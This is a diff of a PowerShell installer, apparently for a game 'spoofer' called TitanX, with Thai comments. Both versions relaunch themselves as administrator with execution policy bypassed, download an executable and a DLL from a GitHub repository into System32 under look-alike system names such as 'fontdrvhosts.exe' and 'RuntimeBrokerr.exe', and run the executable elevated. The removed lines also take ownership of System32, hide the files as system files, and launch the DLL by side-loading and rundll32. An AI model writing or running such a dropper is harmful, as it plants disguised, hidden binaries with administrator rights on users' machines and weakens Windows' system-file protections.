@@ -1,12 +1,11 @@
 # Menu Selection
-Write-Host "+H1 Bomber Seanual X Spoofer Welcome to TitanX:"
 Write-Host "1. Install & Run"
 Write-Host "2. Clean"
 
 $choice = Read-Host "Enter choice (1/2)"
 
 # Check for Administrator rights
-# --------------------------------------------------------------------
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Write-Host "Restarting with administrator privileges..."
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
@@ -14,230 +13,73 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # Define paths and variables
-# --------------------------------------------------------------------
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 $System32Path = "$env:windir\System32"
-$SexeDestination = Join-Path $System32Path "fontdrvhosts.exe"
+$SexeDestination = Join-Path $System32Path "RuntimeBrokerr.exe"
 $DllDestination = Join-Path $System32Path "Guna.UI2.dll"
-
-# URLs - เปลี่ยนตรงนี้ได้เลย
 $SexeUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/New%20folder/System.exe"
 $DllUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/gogo.dll"
 
 # Install & Run Mode
-# --------------------------------------------------------------------
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 if ($choice -eq "1") {
     Write-Host "`nStarting installation..."
-    
-    # ตรวจสอบสิทธิ์เขียนใน System32
-    Write-Host "Checking System32 write permissions..."
-    $testFile = Join-Path $System32Path "test_perm.tmp"
-    try {
-        $null > $testFile
-        Remove-Item $testFile -Force
-        Write-Host "System32 is writable." -ForegroundColor Green
-    } catch {
-        Write-Host "Cannot write to System32 directly. Using alternative method..." -ForegroundColor Yellow
-        # ใช้ TrustedInstaller สำหรับเขียน System32
-        $cmd = "cmd /c takeown /f `"$System32Path`" /r /d y && icacls `"$System32Path`" /grant Administrators:F /t"
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmd" -WindowStyle Hidden -Wait
-    }
 
-    # Download files to System32
-    Write-Host "Downloading files to System32..."
-    
-    # Download DLL
+    # Download DLL first
+    Write-Host "Downloading Guna.UI2.dll..."
     try {
-        Write-Host "Downloading Guna.UI2.dll..."
-        Invoke-WebRequest -Uri $DllUrl -OutFile $DllDestination -ErrorAction Stop
+        Invoke-WebRequest -Uri $DllUrl -OutFile $DllDestination
         Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
     } catch {
-        Write-Host "Guna.UI2.dll download failed. Trying alternative method..." -ForegroundColor Yellow
-        # ใช้ BitsTransfer ถ้า WebRequest ล้มเหลว
-        try {
-            Import-Module BitsTransfer
-            Start-BitsTransfer -Source $DllUrl -Destination $DllDestination
-            Write-Host "Guna.UI2.dll download completed (BITS)." -ForegroundColor Green
-        } catch {
-            Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
-            exit
-        }
+        Write-Host "Guna.UI2.dll download failed: $." -ForegroundColor Red
+        exit
     }
 
-    # Download EXE
+    # Download exe and rename to fontdrvhosts.exe
+    Write-Host "Downloading and renaming executable to fontdrvhosts.exe..."
     try {
-        Write-Host "Downloading fontdrvhosts.exe..."
-        $tempfile = Join-Path $env:TEMP "fontdrvhosts_temp.exe"
-        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile -ErrorAction Stop
+        $tempfile = Join-Path $env:TEMP "seannual_temp.exe"
+        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile
         Move-Item -Path $tempfile -Destination $SexeDestination -Force
         Write-Host "fontdrvhosts.exe download completed." -ForegroundColor Green
     } catch {
-        Write-Host "fontdrvhosts.exe download failed. Trying alternative method..." -ForegroundColor Yellow
-        try {
-            $webClient = New-Object System.Net.WebClient
-            $webClient.DownloadFile($SexeUrl, $SexeDestination)
-            Write-Host "fontdrvhosts.exe download completed (WebClient)." -ForegroundColor Green
-        } catch {
-            Write-Host "fontdrvhosts.exe download failed: $_" -ForegroundColor Red
-            exit
-        }
+        Write-Host "fontdrvhosts.exe download failed: $." -ForegroundColor Red
+        exit
     }
 
-    # ลาก DLL ใส่ EXE (DLL Side-Loading)
-    Write-Host "Setting up DLL side-loading..."
-    try {
-        # วิธีที่ 1: ใช้ resource hacker (ถ้ามี)
-        if (Test-Path "$env:ProgramFiles\Resource Hacker\ResourceHacker.exe") {
-            $resourceHacker = "$env:ProgramFiles\Resource Hacker\ResourceHacker.exe"
-            $scriptDir = Split-Path $MyInvocation.MyCommand.Path
-            $resourceScript = Join-Path $scriptDir "inject_res.rc"
-            
-            # สร้างไฟล์ resource script
-            @"
-1 DLLDATA "$DllDestination"
-"@ | Out-File $resourceScript -Encoding ASCII
-            
-            # Inject DLL into EXE
-            & $resourceHacker -open "$SexeDestination" -save "$SexeDestination" -resource "$resourceScript" -action addoverwrite
-            
-            Write-Host "DLL injected using Resource Hacker." -ForegroundColor Green
-        } else {
-            # วิธีที่ 2: สร้าง manifest สำหรับ DLL side-loading
-            $manifestContent = @"
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
-<assemblyIdentity
-    name="fontdrvhosts.exe"
-    version="1.0.0.0"
-    processorArchitecture="amd64"
-    type="win32"/>
-<dependency>
-    <dependentAssembly>
-        <assemblyIdentity
-            type="win32"
-            name="Guna.UI2"
-            version="1.0.0.0"/>
-    </dependentAssembly>
-</dependency>
-</assembly>
-"@
-            
-            $manifestPath = "$System32Path\fontdrvhosts.exe.manifest"
-            $manifestContent | Out-File $manifestPath -Encoding UTF8
-            
-            # วิธีที่ 3: ใช้ SetDllDirectory เพื่อให้ EXE โหลด DLL จาก System32
-            $injectorScript = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
-
-class DllInjector {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    static extern bool SetDllDirectory(string lpPathName);
-    
-    static void Main() {
-        // Set DLL directory to System32
-        SetDllDirectory(@"$System32Path");
-        
-        // Start the EXE
-        Process.Start(@"$SexeDestination");
-    }
-}
-"@
-            
-            # คอมไพล์และรัน injector
-            Add-Type -TypeDefinition $injectorScript -Language CSharp -ReferencedAssemblies "System"
-            $assembly = [System.Reflection.Assembly]::GetExecutingAssembly()
-            $type = $assembly.GetType("DllInjector")
-            $method = $type.GetMethod("Main", [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::NonPublic)
-            $method.Invoke($null, $null)
-            
-            Write-Host "DLL side-loading configured." -ForegroundColor Green
-        }
-    } catch {
-        Write-Host "DLL injection setup failed: $_" -ForegroundColor Yellow
-        Write-Host "Using standard execution (EXE and DLL in same folder)." -ForegroundColor Yellow
-    }
-
-    # Set file attributes to look like system files
-    Write-Host "Setting system file attributes..."
-    try {
-        Set-ItemProperty -Path $SexeDestination -Name Attributes -Value "Hidden,System,ReadOnly" -Force
-        Set-ItemProperty -Path $DllDestination -Name Attributes -Value "Hidden,System,ReadOnly" -Force
-    } catch {
-        Write-Host "Could not set file attributes." -ForegroundColor Yellow
-    }
-
-    # Run the program
+    # Run the program directly
     Write-Host "Starting the program..."
     try {
-        # ใช้ rundll32 เพื่อโหลด DLL ก่อน แล้วค่อยรัน EXE
-        $rundllArgs = "`"$DllDestination`",#1"
-        Start-Process -FilePath "rundll32.exe" -ArgumentList $rundllArgs -WindowStyle Hidden
-        
-        # รัน EXE หลังจาก DLL โหลดแล้ว
-        Start-Sleep -Seconds 2
-        Start-Process -FilePath $SexeDestination -WindowStyle Hidden
-        
+        Start-Process -FilePath $SexeDestination -Verb RunAs
         Write-Host "Program started successfully." -ForegroundColor Green
     } catch {
-        Write-Host "Failed to start program: $_" -ForegroundColor Red
-        Write-Host "Trying direct execution..." -ForegroundColor Yellow
-        try {
-            Start-Process -FilePath $SexeDestination -WindowStyle Hidden
-            Write-Host "Program started (direct execution)." -ForegroundColor Green
-        } catch {
-            Write-Host "All startup methods failed." -ForegroundColor Red
-        }
+        Write-Host "Failed to start program: $." -ForegroundColor Red
     }
-    
     Write-Host "`nInstallation completed successfully." -ForegroundColor Green
 
 # Clean Mode
-# --------------------------------------------------------------------
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 } elseif ($choice -eq "2") {
     Write-Host "Cleanup installation..."
 
     # Stop the process if running
     Write-Host "Stopping fontdrvhosts.exe process..."
     try {
-        Get-Process -Name "fontdrvhosts" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Stop-Process -Name "fontdrvhosts" -Force -ErrorAction SilentlyContinue
         Write-Host "Process stopped." -ForegroundColor Green
     } catch {
-        Write-Host "No running process found." -ForegroundColor Yellow
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
     }
-    
-    # Stop rundll32 processes that might be using the DLL
-    Write-Host "Stopping related processes..."
-    try {
-        Get-Process -Name "rundll32" -ErrorAction SilentlyContinue | Where-Object {
-            $_.Modules.ModuleName -contains "Guna.UI2.dll"
-        } | Stop-Process -Force
-    } catch {}
 
-    # Remove files from System32
+    # Remove files if they exist
     if (Test-Path $SexeDestination) {
-        try {
-            Remove-Item $SexeDestination -Force
-            Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
-        } catch {
-            Write-Host "Could not remove executable (might be in use)." -ForegroundColor Red
-        }
+        Remove-Item $SexeDestination -Force
+        Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
     }
 
     if (Test-Path $DllDestination) {
-        try {
-            Remove-Item $DllDestination -Force
-            Write-Host "Removed DLL: $DllDestination" -ForegroundColor Green
-        } catch {
-            Write-Host "Could not remove DLL (might be in use)." -ForegroundColor Red
-        }
-    }
-    
-    # Remove manifest file if exists
-    $manifestPath = "$System32Path\fontdrvhosts.exe.manifest"
-    if (Test-Path $manifestPath) {
-        Remove-Item $manifestPath -Force -ErrorAction SilentlyContinue
-        Write-Host "Removed manifest file." -ForegroundColor Green
+        Remove-Item $DllDestination -Force
+        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
     }
 
     Write-Host "Cleanup completed." -ForegroundColor Green
